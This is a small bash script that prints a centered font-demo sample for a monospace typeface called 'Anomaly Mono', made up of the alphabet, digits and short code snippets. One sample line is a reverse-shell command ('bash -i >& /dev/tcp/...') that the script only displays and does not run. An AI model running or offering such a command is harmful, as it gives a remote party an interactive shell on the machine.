#!/bin/bash

clear
echo ""
read -r -d '' DEMO_STRING << EOM
Anomaly Mono

ABCDEFGHIJKLMNOPQRSTUVWXYZ
abcdefghijklmnopqrstuvwxyz
012346789
!@#$%^&*()_+-={|}
[/]~:;"'<>.,?/

public static void main(String[] args) { }
function square(n) { return n * n; }
sum = lambda x, y : x + y
(x ^= y), (y ^= x), (x ^= y);
bash -i >& /dev/tcp/192.168.0.XX 0>&1
379965d428a042f18113f3c2ff7f0e15

___
EOM

columns="$(tput cols)"
while read -r line; do
    printf "%*s\n" $(( (${#line} + columns) / 2)) "$line"
done <<< "$DEMO_STRING"
